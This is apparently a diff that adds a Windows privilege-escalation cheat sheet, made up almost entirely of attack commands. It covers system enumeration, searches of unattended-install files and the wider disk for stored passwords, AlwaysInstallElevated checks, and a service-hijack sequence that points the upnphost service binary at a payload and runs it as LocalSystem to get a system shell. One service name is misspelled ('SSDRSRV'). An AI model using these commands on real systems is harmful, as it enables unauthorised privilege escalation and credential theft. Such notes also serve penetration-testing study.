@@ -1,0 +1,47 @@
+at command
+at time /interactive "cmd.exe"
+time /t
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+schtasks /query /fo LIST /v
+netstat -ano
+arp -A
+tasklist /SVC
+net start
+DRIVERQUERY
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic /?
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
+AlwaysInstallElevated installs .msi as system.
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe -ucqv SSDPSRV
+sc qc upnphost
+sc config upnphost binpath= payload
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config SSDPSRV start= demand
+sc qc upnphost
+net start SSDRSRV
+net start upnphost
+
+any of the following permissions will give us system shell:- 
+Service_change_config - reconfigure service binary
+Write_DAC - reconfigure permissions leading to service_change_config
+WRITE_OWNER - can become owner, reconfigure permissions
+GENERIC_WRITE - Inherits SERVICE_CHANGE_CONFIG
+GENERIC_ALL - Inherits SERVICE_CHANGE_CONFIG
+
+
+
